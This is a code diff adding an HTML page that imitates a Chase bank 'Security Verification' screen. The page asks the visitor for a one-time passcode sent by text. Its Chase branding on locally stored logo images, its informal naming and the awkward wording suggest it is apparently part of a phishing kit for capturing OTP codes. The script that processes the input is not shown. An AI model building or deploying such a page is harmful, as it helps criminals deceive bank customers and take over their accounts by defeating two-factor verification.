@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - chase.com</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" 
+            href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,
+            wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+
+    <link rel="icon" href="images/1000193120-removebg-preview.png" 
+            type="image/png">
+    <script src="https://kit.fontawesome.com/73be9fb684.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="securebody" id="otp-page">
+    <!-- header -->
+    <div class="headercon">
+        <div class="exitbuttoncon">
+            <span class="exitinline">
+                <i class="fa-solid fa-chevron-left whitechevon"></i>
+                <button class="exitbutton" id="exitbuttonsecure">Exit</button>
+            </span>
+        </div>
+        <div class="hederimageholder">
+            <img src="images/white_chase_logo_innercircl-removebg-preview.png" alt="">
+        </div>
+        <div class="languagehlder">
+            <button class="expaniol">Español</button>
+        </div>
+    </div>
+        <!-- header stop-->
+
+        <!-- body contents -->
+    <div class="boycontainer">
+            <!-- body left content -->
+        <div class="leftflexdiv">
+            <span class="questionspan">
+                <i class="fa-regular fa-circle-question secureqestionicon"></i>
+                <button class="qestion">Question?</button>
+            </span>
+            <div class="unexpecedspancon">
+                <span class="Faqread">
+                    <button class="FaQs">Read our FaQs</button>
+                    <i class="fa-solid fa-chevron-right"></i>
+                </span>
+            </div>
+        </div>
+            <!-- body left content stop -->
+
+            <!-- main body right content -->
+        <div class="bodyrightcontents">
+            
+            <div class="nnertextcon">
+                <div class="firsttextcon">
+                    <p class="firsttext">Security Verification</p>
+                </div>
+                <div class="loadingcon">
+                    <div class="innerloaading"></div>
+                </div>
+                    <p class="bodyheadertext">Let's confirm your identity.</p>
+                    <p class="paragraph">
+                        To protect your account, please tell us the requested info so
+                        we can confirm your identity. if you have more than one accounts, choose one and we'll take care of the rest.
+                    </p>
+                <p class="otpmessage">We sent you a text message</p>
+                <div class="otpinputcon">
+                    <label for="otpinputid" class="otpinputlabel" id="redwrongeotpmessage">Please tell us your one-time code (OTP)</label>
+                    <input type="text" name="" class="otpinput" id="otpinputid">
+                    <div id="showwrongotp" class="wrongshow">
+                        <span class="wronginput">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid OTP code.</p>
+                        </span>
+                    </div>
+                </div>
+                <button class="nextbutton" id="otpnextbutton">Next</button>
+            </div>
+
+        </div>
+            <!-- main body right content stop-->
+    </div>
+     
+
+
+
+    <script src="index.js" type="module"></script>
+</body>
+</html>
